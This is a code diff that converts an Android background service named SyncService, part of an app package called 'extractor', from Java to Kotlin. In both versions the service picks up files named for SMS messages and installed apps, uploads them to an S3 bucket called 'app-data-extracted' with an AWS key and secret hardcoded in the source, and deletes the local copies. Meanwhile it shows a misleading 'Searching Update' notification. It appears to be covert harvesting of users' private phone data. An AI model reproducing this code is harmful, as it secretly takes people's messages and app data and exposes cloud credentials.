@@ -1,199 +1,157 @@
-package info.kalagato.com.extractor;
+package info.kalagato.com.extractor
 
-import android.app.Notification;
-import android.app.PendingIntent;
-import android.app.Service;
-import android.content.Context;
-import android.content.Intent;
-import android.os.Environment;
-import android.os.Handler;
-import android.os.HandlerThread;
-import android.os.IBinder;
-import android.os.Looper;
-import android.os.Message;
-import android.os.Process;
+import com.amazonaws.auth.BasicAWSCredentials
+import info.kalagato.com.extractor.SyncService
+import com.amazonaws.services.s3.AmazonS3Client
+import com.amazonaws.mobileconnectors.s3.transferutility.TransferUtility
+import com.amazonaws.mobile.client.AWSMobileClient
+import com.amazonaws.mobileconnectors.s3.transferutility.TransferObserver
+import com.amazonaws.mobileconnectors.s3.transferutility.TransferListener
+import android.content.Intent
+import info.kalagato.com.extractor.Extractor
+import android.app.PendingIntent
+import android.app.Service
+import android.os.*
+import androidx.core.app.NotificationCompat
+import com.amazonaws.mobileconnectors.s3.transferutility.TransferState
+import info.kalagato.com.extractor.R
+import java.io.File
+import java.io.IOException
+import java.lang.Exception
+import java.text.SimpleDateFormat
+import java.util.*
 
-import com.amazonaws.auth.BasicAWSCredentials;
-import com.amazonaws.mobile.client.AWSMobileClient;
-import com.amazonaws.mobile.client.UserStateDetails;
-import com.amazonaws.mobileconnectors.s3.transferutility.TransferListener;
-import com.amazonaws.mobileconnectors.s3.transferutility.TransferObserver;
-import com.amazonaws.mobileconnectors.s3.transferutility.TransferState;
-import com.amazonaws.mobileconnectors.s3.transferutility.TransferUtility;
-import com.amazonaws.services.s3.AmazonS3Client;
-import com.amazonaws.services.s3.model.ObjectMetadata;
+class SyncService : Service() {
+    private val TAG = "sync-service"
+    private var mServiceHandler: ServiceHandler? = null
+    private var mServiceLooper: Looper? = null
 
-
-
-import java.io.File;
-import java.io.IOException;
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
-import java.util.Date;
-import java.util.Locale;
-
-import static info.kalagato.com.extractor.Constant.CHANNEL_ID;
-
-import androidx.annotation.Nullable;
-import androidx.core.app.NotificationCompat;
-
-public class SyncService extends Service {
-
-    private String TAG = "sync-service";
-    private static final String KEY = "AKIAXTJK7XDQG3HJAFXN";
-    private static final String SECRET = "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";
-
-    private ServiceHandler mServiceHandler;
-    private Looper mServiceLooper;
-
-    private class ServiceHandler extends Handler {
-
-        public ServiceHandler(Looper looper) {
-            super(looper);
-        }
-
-        @Override
-        public void handleMessage(Message msg) {
-
+    private inner class ServiceHandler(looper: Looper?) : Handler(looper!!) {
+        override fun handleMessage(msg: Message) {
             try {
-            Date c = Calendar.getInstance().getTime();
-            SimpleDateFormat df = new SimpleDateFormat("dd-MMM-yyyy", Locale.getDefault());
-            String formattedDate = df.format(c);
-
-            String path = Environment.getExternalStorageDirectory().toString()+"/Folder";
-                File mydir = getApplicationContext().getDir("mydir", Context.MODE_PRIVATE);
-
-            File directory = new File(mydir.getPath());
-            File[] files = directory.listFiles();
-
-
-
-            for (int i = 0; i < files.length; i++)
-            {
-                if(files[i].getName().contains(Constant.SMS) ||
-                        files[i].getName().contains(Constant.INSTALLED_APP) ||
-                        !files[i].getName().contains(formattedDate)){
-                       // files[i].delete();
-                        uploadWithTransferUtility(files[i]);
+                val c = Calendar.getInstance().time
+                val df = SimpleDateFormat("dd-MMM-yyyy", Locale.getDefault())
+                val formattedDate = df.format(c)
+                val path = Environment.getExternalStorageDirectory().toString() + "/Folder"
+                val mydir = applicationContext.getDir("mydir", MODE_PRIVATE)
+                val directory = File(mydir.path)
+                val files = directory.listFiles()
+                for (i in files!!.indices) {
+                    if (files[i].name.contains(Constant.SMS) ||
+                        files[i].name.contains(Constant.INSTALLED_APP) ||
+                        !files[i].name.contains(formattedDate)
+                    ) {
+                        // files[i].delete();
+                        uploadWithTransferUtility(files[i])
+                    }
                 }
+            } catch (ex: Exception) {
+                ex.printStackTrace()
             }
-            }catch (Exception ex){
-                ex.printStackTrace();
-            }
-            stopSelf();
-
+            stopSelf()
         }
 
-        public void uploadWithTransferUtility(File file) {
-
-            BasicAWSCredentials credentials = new BasicAWSCredentials(KEY, SECRET);
-            AmazonS3Client s3Client = new AmazonS3Client(credentials);
-
-            TransferUtility transferUtility =
-                    TransferUtility.builder()
-                            .context(getApplicationContext())
-                            .awsConfiguration(AWSMobileClient.getInstance().getConfiguration())
-                            .s3Client(s3Client)
-                            .build();
+        fun uploadWithTransferUtility(file: File) {
+            val credentials = BasicAWSCredentials(KEY, SECRET)
+            val s3Client = AmazonS3Client(credentials)
+            val transferUtility = TransferUtility.builder()
+                .context(applicationContext)
+                .awsConfiguration(AWSMobileClient.getInstance().configuration)
+                .s3Client(s3Client)
+                .build()
 
 
-
-           /* final File file = new File(getApplicationContext().getDir("mydir", Context.MODE_PRIVATE),
+            /* final File file = new File(getApplicationContext().getDir("mydir", Context.MODE_PRIVATE),
                     "/Folder/" + filename);*/
-            String YOUR_BUCKET_NAME = "app-data-extracted";
-            TransferObserver uploadObserver = transferUtility.upload(YOUR_BUCKET_NAME,
-                            KEY + getPackageName() + "/"+file.getName(),file);
+            val YOUR_BUCKET_NAME = "app-data-extracted"
+            val uploadObserver = transferUtility.upload(
+                YOUR_BUCKET_NAME,
+                KEY + packageName + "/" + file.name, file
+            )
 
             // Attach a listener to the observer to get state update and progress notifications
-            uploadObserver.setTransferListener(new TransferListener() {
-
-                @Override
-                public void onStateChanged(int id, TransferState state) {
+            uploadObserver.setTransferListener(object : TransferListener {
+                override fun onStateChanged(id: Int, state: TransferState) {
                     if (TransferState.COMPLETED == state) {
                         // Handle a completed upload.
-
-                        file.delete();
-                        if(file.exists()){
+                        file.delete()
+                        if (file.exists()) {
                             try {
-                                file.getCanonicalFile().delete();
-                            } catch (IOException e) {
-                                e.printStackTrace();
+                                file.canonicalFile.delete()
+                            } catch (e: IOException) {
+                                e.printStackTrace()
                             }
-                            if(file.exists()){
-                                getApplicationContext().deleteFile(file.getName());
+                            if (file.exists()) {
+                                applicationContext.deleteFile(file.name)
                             }
                         }
                     }
                 }
 
-                @Override
-                public void onProgressChanged(int id, long bytesCurrent, long bytesTotal) {
-                    float percentDonef = ((float) bytesCurrent / (float) bytesTotal) * 100;
-                    int percentDone = (int)percentDonef;
+                override fun onProgressChanged(id: Int, bytesCurrent: Long, bytesTotal: Long) {
+                    val percentDonef = bytesCurrent.toFloat() / bytesTotal.toFloat() * 100
+                    val percentDone = percentDonef.toInt()
 
 //                    Log.d("YourActivity", "ID:" + id + " bytesCurrent: " + bytesCurrent
 //                            + " bytesTotal: " + bytesTotal + " " + percentDone + "%");
                 }
 
-                @Override
-                public void onError(int id, Exception ex) {
+                override fun onError(id: Int, ex: Exception) {
                     // Handle errors
                 }
-
-            });
+            })
 
             // If you prefer to poll for the data, instead of attaching a
             // listener, check for the state and progress in the observer.
-            if (TransferState.COMPLETED == uploadObserver.getState()) {
+            if (TransferState.COMPLETED == uploadObserver.state) {
                 // Handle a completed upload.
             }
         }
     }
 
-    @Override
-    public void onCreate() {
-        HandlerThread thread = new HandlerThread("ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND);
-        thread.start();
+    override fun onCreate() {
+        val thread = HandlerThread("ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND)
+        thread.start()
 
         // Get the HandlerThread's Looper and use it for our Handler
-        mServiceLooper = thread.getLooper();
-        mServiceHandler = new SyncService.ServiceHandler(mServiceLooper);
+        mServiceLooper = thread.looper
+        mServiceHandler = ServiceHandler(mServiceLooper)
     }
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-
-        Intent notificationIntent = new Intent(this, Extractor.class);
-        PendingIntent pendingIntent = PendingIntent.getActivity(this,
-                0, notificationIntent, 0);
-
-        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Searching Update")
-                .setContentText("")
-                .setSmallIcon(R.drawable.ic_settings)
-                .setContentIntent(pendingIntent)
-                .build();
-
-        startForeground(1, notification);
+    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
+        val notificationIntent = Intent(this, Extractor::class.java)
+        val pendingIntent = PendingIntent.getActivity(
+            this,
+            0, notificationIntent, 0
+        )
+        val notification = NotificationCompat.Builder(this, Constant.CHANNEL_ID)
+            .setContentTitle("Searching Update")
+            .setContentText("")
+            .setSmallIcon(R.drawable.ic_settings)
+            .setContentIntent(pendingIntent)
+            .build()
+        startForeground(1, notification)
 
         // For each start request, send a message to start a job and deliver the
         // start ID so we know which request we're stopping when we finish the job
-        Message msg = mServiceHandler.obtainMessage();
-        msg.arg1 = startId;
-        mServiceHandler.sendMessage(msg);
+        val msg = mServiceHandler!!.obtainMessage()
+        msg.arg1 = startId
+        mServiceHandler!!.sendMessage(msg)
 
         // If we get killed, after returning from here, restart
-        return START_NOT_STICKY;
+        return START_NOT_STICKY
     }
 
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
+    override fun onDestroy() {
+        super.onDestroy()
     }
 
-    @Nullable
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
+    override fun onBind(intent: Intent): IBinder? {
+        return null
+    }
+
+    companion object {
+        private const val KEY = "AKIAXTJK7XDQG3HJAFXN"
+        private const val SECRET = "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"
     }
 }
